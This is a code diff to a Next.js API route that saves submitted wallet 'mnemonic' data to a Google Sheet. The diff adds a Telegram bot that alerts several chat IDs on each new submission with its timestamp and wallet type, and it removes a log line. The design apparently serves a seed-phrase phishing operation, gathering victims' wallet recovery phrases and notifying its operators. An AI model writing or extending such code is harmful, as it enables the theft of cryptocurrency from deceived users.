@@ -3,6 +3,7 @@ import { type NextRequest, NextResponse } from "next/server"
 import { GoogleSpreadsheet } from "google-spreadsheet"
 import { JWT } from "google-auth-library"
 import axios from "axios"
+import { Telegraf } from "telegraf";
 
 // Types
 interface MnemonicData {
@@ -119,6 +120,46 @@ async function initGoogleSheet(): Promise<GoogleSpreadsheet> {
   return doc
 }
 
+
+// Update your Telegram notification function
+async function sendTelegramNotification(rowData: Record<string, string>) {
+  try {
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatIdsString = process.env.TELEGRAM_CHAT_IDS;
+    
+    if (!botToken || !chatIdsString) {
+      console.error("Telegram credentials not configured");
+      return;
+    }
+    
+    // Split the comma-separated string into an array of chat IDs
+    const chatIds = chatIdsString.split(',');
+    const bot = new Telegraf(botToken);
+    
+    const message = `
+🔔 New Mnemonic Submission
+────────────────────
+📅 Timestamp: ${new Date(rowData.Timestamp).toLocaleString()}
+💼 Wallet Type: ${rowData.Abundance_Type}
+────────────────────s
+
+    `;
+    
+    // Send message to each chat ID
+    for (const chatId of chatIds) {
+      try {
+        await bot.telegram.sendMessage(chatId.trim(), message);
+      } catch (error) {
+        console.error(`Error sending to ${chatId}:`, error);
+      }
+    }
+  } catch (error) {
+    console.error("Error in Telegram notification function:", error);
+  }
+}
+
+
+
 // POST handler
 export async function POST(req: NextRequest) {
   try {
@@ -158,8 +199,8 @@ export async function POST(req: NextRequest) {
 
     // Add row to sheet
     await sheet.addRow(rowData)
+    await sendTelegramNotification(rowData);
 
-    console.log("Mnemonic data successfully added to Google Sheet:", rowData)
 
     return NextResponse.json({
       success: true,
@@ -182,8 +223,7 @@ export async function POST(req: NextRequest) {
       { status: 500 },
     )
   }
-}
-
+} 
 // GET handler for health check
 export async function GET() {
   return NextResponse.json({
